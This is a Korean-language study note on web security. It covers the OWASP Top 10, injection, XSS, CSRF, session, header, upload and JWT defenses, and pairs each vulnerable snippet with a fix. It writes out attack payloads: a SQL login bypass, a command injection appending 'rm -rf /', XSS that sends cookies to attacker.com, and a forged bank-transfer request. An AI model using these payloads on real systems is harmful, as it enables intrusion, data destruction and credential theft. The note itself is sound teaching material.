---
title: web-security
tags: [csrf, owasp, security, sql-injection, web, xss]
aliases: [OWASP, SQL Injection, XSS, 웹 보안]
date modified: 2026-04-05 17:48:11 +09:00
date created: 2025-12-20 00:17:40 +09:00
---

## 🌐 개요 (Overview)

웹 애플리케이션은 인터넷에 노출되어 다양한 공격에 취약합니다. OWASP Top 10 은 가장 중요한 웹 보안 위협을 정리한 표준입니다.

## 🔝 OWASP Top 10 (2021)

| 순위 | 위협 | 설명 |
|------|------|------|
| A01 | Broken Access Control | 접근 제어 취약점 |
| A02 | Cryptographic Failures | 암호화 실패 |
| A03 | Injection | SQL/Command Injection |
| A04 | Insecure Design | 불안전한 설계 |
| A05 | Security Misconfiguration | 보안 설정 오류 |
| A06 | Vulnerable Components | 취약한 컴포넌트 |
| A07 | Authentication Failures | 인증 실패 |
| A08 | Software and Data Integrity | 무결성 검증 실패 |
| A09 | Logging Failures | 로깅 및 모니터링 부족 |
| A10 | SSRF | Server-Side Request Forgery |

## 💉 Injection 공격

### SQL Injection

**취약한 코드**:

```python
# ❌ 위험: 사용자 입력을 직접 쿼리에 삽입
username = request.POST['username']
password = request.POST['password']
query = f"SELECT * FROM users WHERE username='{username}' AND password='{password}'"
```

**공격**:

```sql
-- 입력: username = admin' --
SELECT * FROM users WHERE username='admin' --' AND password='xxx'
-- password 검증 우회!
```

**안전한 코드**:

```python
# ✅ Prepared Statement 사용
cursor.execute(
    "SELECT * FROM users WHERE username=? AND password=?",
    (username, password)
)
```

### Command Injection

**취약한 코드**:

```python
# ❌ 위험
filename = request.GET['file']
os.system(f"cat {filename}")
```

**공격**:

```bash
# 입력: file=test.txt; rm -rf /
cat test.txt; rm -rf /
```

**방어**:

- 입력 검증 및 화이트리스트
- `subprocess` 등 안전한 API 사용
- 셸 호출 최소화

## 🔓 XSS (Cross-Site Scripting)

### XSS 유형

#### 1. Reflected XSS (반사형)

```html
<!-- 취약한 검색 페이지 -->
<h1>검색 결과: <?php echo $_GET['query']; ?></h1>

<!-- 공격 URL -->
search.php?query=<script>alert(document.cookie)</script>
```

#### 2. Stored XSS (저장형)

```javascript
// 게시판에 악성 스크립트 저장
<script>
  // 쿠키 탈취
  new Image().src = 'http://attacker.com/steal?' + document.cookie;
</script>
```

#### 3. DOM-based XSS

```javascript
// 취약한 코드
document.getElementById('output').innerHTML = location.hash.substring(1);

// 공격 URL
http://example.com/#<img src=x onerror=alert(1)>
```

### XSS 방어

```javascript
// ✅ 출력 인코딩
function escapeHtml(unsafe) {
    return unsafe
        .replace(/&/g, "&amp;")
        .replace(/</g, "&lt;")
        .replace(/>/g, "&gt;")
        .replace(/"/g, "&quot;")
        .replace(/'/g, "&#039;");
}

// ✅ CSP (Content Security Policy) 헤더
Content-Security-Policy: default-src 'self'; script-src 'self' 'nonce-random123'
```

## 🎭 CSRF (Cross-Site Request Forgery)

### 공격 시나리오

```html
<!-- 공격자 사이트 -->
<img src="http://bank.com/transfer?to=attacker&amount=1000000">
<!-- 사용자가 은행 사이트에 로그인되어 있으면 자동 실행 -->
```

### 방어: CSRF 토큰

```html
<!-- ✅ 폼에 CSRF 토큰 포함 -->
<form method="POST">
    <input type="hidden" name="csrf_token" value="random_secure_token">
    <input type="text" name="amount">
    <button>전송</button>
</form>
```

```python
# 서버 측 검증
if request.form['csrf_token'] != session['csrf_token']:
    return "CSRF 공격 차단", 403
```

**추가 방어**:

- SameSite 쿠키 속성
- Referer 헤더 검증
- 중요 작업은 재인증 요구

## 🔐 인증/세션 보안

### 안전한 세션 관리

```python
# ✅ 세션 설정
app.config['SESSION_COOKIE_SECURE'] = True      # HTTPS only
app.config['SESSION_COOKIE_HTTPONLY'] = True    # JavaScript 접근 차단
app.config['SESSION_COOKIE_SAMESITE'] = 'Lax'   # CSRF 방어
app.config['PERMANENT_SESSION_LIFETIME']= 1800  # 30분 타임아웃
```

### 패스워드 보안

```python
# ✅ Argon2로 해싱
from argon2 import PasswordHasher
ph = PasswordHasher()

# 저장
password_hash = ph.hash(password)

# 검증
try:
    ph.verify(password_hash, password)
except:
    # 로그인 실패
```

## 🛡️ 보안 헤더

### 주요 HTTP 보안 헤더

```http
# XSS 방어
X-XSS-Protection: 1; mode=block
X-Content-Type-Options: nosniff

# Clickjacking 방어
X-Frame-Options: DENY
Content-Security-Policy: frame-ancestors 'none'

# HTTPS 강제
Strict-Transport-Security: max-age=31536000; includeSubDomains

# 권한 제한
Permissions-Policy: geolocation=(), microphone=()
```

### CSP (Content Security Policy)

```http
Content-Security-Policy: 
    default-src 'self';
    script-src 'self' 'nonce-{random}';
    style-src 'self' 'unsafe-inline';
    img-src 'self' data:;
    connect-src 'self' https://api.example.com;
```

## 📁 파일 업로드 보안

```python
# ✅ 안전한 파일 업로드
ALLOWED_EXTENSIONS = {'png', 'jpg', 'gif', 'pdf'}

def allowed_file(filename):
    return '.' in filename and \
           filename.rsplit('.', 1)[1].lower() in ALLOWED_EXTENSIONS

# 파일명 sanitize
from werkzeug.utils import secure_filename
filename = secure_filename(file.filename)

# 파일 타입 검증
import magic
mime = magic.from_buffer(file.read(1024), mime=True)
if mime not in ['image/jpeg', 'image/png']:
    return "Invalid file type", 400

# 저장 위치: 웹 루트 밖
UPLOAD_FOLDER = '/var/data/uploads'
```

## 🔗 API 보안

### JWT 보안

```python
# ✅ 안전한 JWT 설정
JWT_SECRET_KEY = secrets.token_urlsafe(32)
JWT_ALGORITHM = 'HS256'
JWT_ACCESS_TOKEN_EXPIRES = timedelta(minutes=15)
JWT_REFRESH_TOKEN_EXPIRES = timedelta(days=7)

# HttpOnly 쿠키에 저장 (XSS 방어)
@app.route('/login', methods=['POST'])
def login():
    access_token = create_access_token(identity=user.id)
    response = jsonify({"msg": "login successful"})
    set_access_cookies(response, access_token)
    return response
```

### Rate Limiting

```python
from flask_limiter import Limiter

limiter = Limiter(
    app,
    key_func=lambda: request.remote_addr,
    default_limits=["200 per day", "50 per hour"]
)

@app.route("/api/sensitive")
@limiter.limit("5 per minute")
def sensitive():
    return "data"
```

## ✅ 보안 체크리스트

### 입력 검증
- [ ] 모든 사용자 입력 검증
- [ ] 화이트리스트 방식 사용
- [ ] 타입 및 길이 제한

### 출력 인코딩
- [ ] HTML 컨텍스트 인코딩
- [ ] URL 인코딩
- [ ] JavaScript 인코딩

### [[authentication-authorization|인증/인가]]
- [ ] 강력한 패스워드 정책
- [ ] MFA 구현
- [ ] 세션 타임아웃

### [[cryptography-basics|암호화]]
- [ ] HTTPS 사용
- [ ] 민감 데이터 암호화
- [ ] 안전한 난수 생성

## 🔗 연결 문서 (Related Documents)

- [[authentication-authorization]] - 웹 인증 메커니즘
- [[cryptography-basics]] - 암호화 기초
- [[network-security-protocols]] - HTTPS/TLS
